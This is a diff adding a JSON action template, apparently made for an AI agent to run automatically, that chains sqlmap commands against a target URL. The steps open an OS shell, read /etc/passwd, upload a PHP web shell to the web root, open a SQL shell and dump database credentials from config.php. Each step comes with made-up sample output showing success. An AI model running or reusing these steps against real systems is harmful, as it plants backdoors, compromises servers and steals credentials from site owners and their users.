@@ -1,0 +1,30 @@
+{
+  "name": "sqlmap_os_shell_file_ops",
+  "description": "Advanced exploitation with sqlmap including OS shell access, file read/write, and command execution",
+  "pattern": "sqlmap.*shell|sqlmap.*os.*cmd|sqlmap.*file.*read|sqlmap.*upload",
+  "parameters": ["target_url", "operation"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "--os-shell", "--batch"]},
+      "expected_output": {"type": "string", "example": "[16:00:10] [INFO] testing connection to the target URL\n[16:00:11] [INFO] the back-end DBMS is MySQL\n[16:00:12] [INFO] going to use a web backdoor for command execution\n[16:00:13] [INFO] fingerprinting the back-end DBMS operating system\n[16:00:14] [INFO] the back-end DBMS operating system is Linux\n[16:00:15] [INFO] testing if the target URL is writeable\n[16:00:17] [INFO] the remote file '/var/www/html/tmpuakzr.php' has been successfully uploaded\n[16:00:18] [INFO] the backdoor has been successfully uploaded on '/var/www/html' - http://target.com/tmpuakzr.php\n[16:00:19] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER\nos-shell> whoami\nwww-data\nos-shell> id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nos-shell> uname -a\nLinux webserver 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "--file-read", "/etc/passwd", "--batch"]},
+      "expected_output": {"type": "string", "example": "[16:01:30] [INFO] testing connection to the target URL\n[16:01:31] [INFO] the back-end DBMS is MySQL\n[16:01:32] [INFO] fetching file: '/etc/passwd'\n[16:01:35] [INFO] the local file '/home/user/.local/share/sqlmap/output/target.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (1547 B)\nfiles saved to [1]:\n[*] /home/user/.local/share/sqlmap/output/target.com/files/_etc_passwd (same as remote file)\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo '<?php system($_GET[\"cmd\"]); ?>' > backdoor.php && sqlmap -u '{{target_url}}' --file-write=backdoor.php --file-dest=/var/www/html/shell.php --batch"]},
+      "expected_output": {"type": "string", "example": "[16:02:50] [INFO] testing connection to the target URL\n[16:02:51] [INFO] the back-end DBMS is MySQL\n[16:02:52] [INFO] the local file 'backdoor.php' has been written to the back-end DBMS file system ('/var/www/html/shell.php')\n[16:02:53] [INFO] the file has been successfully uploaded\n[16:02:54] [INFO] trying to validate file upload\n[16:02:55] [INFO] file 'shell.php' appears to be accessible on: http://target.com/shell.php\n[16:02:56] [INFO] testing uploaded file with: http://target.com/shell.php?cmd=echo%20SQLMAP\n[16:02:57] [INFO] response contains 'SQLMAP' - upload successful\nWeb shell uploaded: http://target.com/shell.php?cmd=whoami"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "--sql-shell", "--batch"]},
+      "expected_output": {"type": "string", "example": "[16:03:40] [INFO] testing connection to the target URL\n[16:03:41] [INFO] the back-end DBMS is MySQL\n[16:03:42] [INFO] calling SQL shell. To quit type 'x' or 'q' and press ENTER\nsql-shell> SELECT user();\nuser(): root@localhost\nsql-shell> SELECT version();\nversion(): 5.7.33-0ubuntu0.18.04.1\nsql-shell> SELECT @@datadir;\n@@datadir: /var/lib/mysql/\nsql-shell> SHOW DATABASES;\nDatabase\ninformation_schema\nmysql\nperformance_schema\nwebapp_db"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "sqlmap -u '{{target_url}}' --os-cmd='cat /var/www/html/config.php' --batch 2>&1 | grep -A 20 'command standard output'"]},
+      "expected_output": {"type": "string", "example": "[16:04:50] [INFO] executing command: cat /var/www/html/config.php\ncommand standard output:\n<?php\n$db_host = 'localhost';\n$db_user = 'webapp_admin';\n$db_pass = 'SecureDBPass123!';\n$db_name = 'webapp_db';\n\n$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);\nif (!$conn) {\n    die('Database connection failed: ' . mysqli_connect_error());\n}\n?>\n\nDatabase credentials extracted from config file"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
